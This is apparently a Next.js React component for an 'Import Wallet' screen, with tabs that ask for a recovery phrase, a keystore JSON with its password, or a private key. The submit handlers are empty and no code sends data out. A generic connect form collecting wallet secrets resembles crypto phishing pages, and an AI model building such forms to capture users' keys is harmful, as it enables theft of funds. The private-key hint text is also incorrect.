"use client";

import { useState } from "react";
import ImportIcon from "@/assets/import-icon.svg";
import Image from "next/image";

export default function GeneralConnect() {
  const [tabState, setTabState] = useState<string>("phrase");

  return (
    <div className="p-5 w-full">
      <div className="flex items-center gap-2 mb-6">
        <Image src={ImportIcon} alt="import-icon" width={30} height={30} />
        <h4 className="text-white text-2xl font-semibold">Import Wallet</h4>
      </div>

      <div className="flex border-b-[1px] border-solid border-white">
        <button
          className="text-white font-semibold px-4 py-3 border-b-[2px] border-solid border-transparent hover:border-white transition-all duration-500 ease-in-out"
          onClick={() => setTabState("phrase")}
        >
          Phrase
        </button>
        <button
          className="text-white font-semibold px-4 py-3 border-b-[2px] border-solid border-transparent hover:border-white transition-all duration-500 ease-in-out"
          onClick={() => setTabState("keystore")}
        >
          Keystore JSON
        </button>
        <button
          className="text-white font-semibold px-4 py-3 border-b-[2px] border-solid border-transparent hover:border-white transition-all duration-500 ease-in-out"
          onClick={() => setTabState("privateKey")}
        >
          Private Key
        </button>
      </div>

      {tabState === "phrase" && (
        <form onSubmit={() => {}} className="mt-8">
          <textarea
            name="phrase"
            id="phrase"
            placeholder="Enter your phrase"
            cols={30}
            rows={5}
            required
            className="w-full rounded-md p-3"
          ></textarea>

          <h4 className="text-slate-300 text-sm mt-4">
            Typically 12 (sometimes 24) words seperated by a single spaces.
          </h4>
          <button className="w-full h-[42px] text-white font-semibold bg-[#2020c9] hover:bg-[#205bc9] hover:shadow-sm mt-5 rounded-md">
            IMPORT
          </button>
        </form>
      )}
      {tabState === "keystore" && (
        <form onSubmit={() => {}} className="mt-8">
          <textarea
            name="phrase"
            id="phrase"
            placeholder="Enter your Keystore JSON"
            cols={30}
            rows={5}
            required
            className="w-full rounded-md p-3"
          ></textarea>

          <input
            type="password"
            placeholder="Password"
            required
            className="w-full rounded-md p-3 mt-4 text-black"
          />

          <h4 className="text-slate-300 text-sm mt-4">
            Several lines of text plus the password you used to encrypt it.
          </h4>
          <button className="w-full h-[42px] text-white font-semibold bg-[#2020c9] hover:bg-[#205bc9] hover:shadow-sm mt-5 rounded-md">
            IMPORT
          </button>
        </form>
      )}
      {tabState === "privateKey" && (
        <form className="">
          <input
            type="text"
            placeholder="Private Key"
            className="w-full rounded-md p-3 mt-4 text-black"
            required
          />
          <h4 className="text-slate-300 text-sm mt-4">
            Typically 12 (sometimes 24) words seperated by a single spaces.
          </h4>

          <button className="w-full h-[42px] text-white font-semibold bg-[#2020c9] hover:bg-[#205bc9] hover:shadow-sm mt-5 rounded-md">
            IMPORT
          </button>
        </form>
      )}
    </div>
  );
}
